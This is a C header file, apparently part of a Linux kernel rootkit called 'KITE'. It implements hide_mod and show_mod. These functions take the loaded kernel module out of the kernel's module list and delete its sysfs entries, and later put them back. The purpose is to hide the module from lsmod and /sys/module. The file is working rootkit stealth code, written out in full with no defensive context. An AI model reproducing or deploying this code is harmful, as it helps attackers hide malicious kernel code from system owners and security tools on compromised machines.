#ifndef KITE_HIDER
    #define KITE_HIDER
    #include <linux/sysfs.h>

struct module_sect_attr {
    struct module_attribute mattr;
    char *name;
    unsigned long address;
};

struct module_sect_attrs {
    struct attribute_group grp;
    unsigned int nsections;
    struct module_sect_attr attrs[0];
};

struct module_notes_attrs {
	struct kobject *dir;
	unsigned int notes;
	struct bin_attribute attrs[0];
};
static int hidden = 0; // flag if module is hidden
static struct list_head *prev_module;
static struct kobject *kobject_prev;
static struct kobject *kobject_parent_prev;
static struct module_sect_attrs *sect_attrs_prev;
static struct module_notes_attrs *notes_attrs_prev;
static const char *mod_fmt;


static void show_mod(void) {
    static int i;
    // add to the modules linked list the current module after the one it already had been attached
    list_add(&THIS_MODULE->list, prev_module);
    // add the kobjects to sysfs again
    kobject_add(kobject_prev, kobject_parent_prev, mod_fmt);
    THIS_MODULE->holders_dir = kobject_create_and_add("holders", &THIS_MODULE->mkobj.kobj);
    for (i=0;(THIS_MODULE->modinfo_attrs[i].attr.name) != NULL;i++){
#ifdef KITE_DEBUG
        pr_info("Creating %s\n", THIS_MODULE->modinfo_attrs[i].attr.name);
#endif  
        if (sysfs_create_file(&THIS_MODULE->mkobj.kobj,&THIS_MODULE->modinfo_attrs[i].attr)!=0)
#ifdef KITE_DEBUG
            pr_err("couldn't create %s\n", THIS_MODULE->modinfo_attrs[i].attr.name);
#endif
    }
    notes_attrs_prev->dir = kobject_create_and_add("notes", &THIS_MODULE->mkobj.kobj);
    for (i=0; i < notes_attrs_prev->notes; i++){
        sysfs_create_bin_file(notes_attrs_prev->dir,
					  &notes_attrs_prev->attrs[i]);
    }
    sysfs_create_group(&THIS_MODULE->mkobj.kobj, &sect_attrs_prev->grp);
    THIS_MODULE->notes_attrs = notes_attrs_prev;
    THIS_MODULE->sect_attrs = sect_attrs_prev;
    kobject_uevent(&THIS_MODULE->mkobj.kobj, KOBJ_ADD);
    hidden = 0;
}


static void hide_mod(void) {
    // keep the module that this module is attached to after in the modules linked list, to reattach later
    prev_module = THIS_MODULE->list.prev;
    // delete this module from the list by linking previous module to the next(thats behind the scenes)
    list_del(&THIS_MODULE->list);
    // remove the kobjects of the module from sysfs, kobject_del calls sysfs_remove_dir which removes all the sub-directories and files from kernfs by using sd which is the kernfs entry.
    kobject_parent_prev = THIS_MODULE->mkobj.kobj.parent;
    kobject_prev = &THIS_MODULE->mkobj.kobj;
    mod_fmt = THIS_MODULE->mkobj.kobj.name;
    sect_attrs_prev = THIS_MODULE->sect_attrs;
    notes_attrs_prev = THIS_MODULE->notes_attrs;

    kobject_del(&THIS_MODULE->mkobj.kobj);
    hidden = 1;
}

#endif
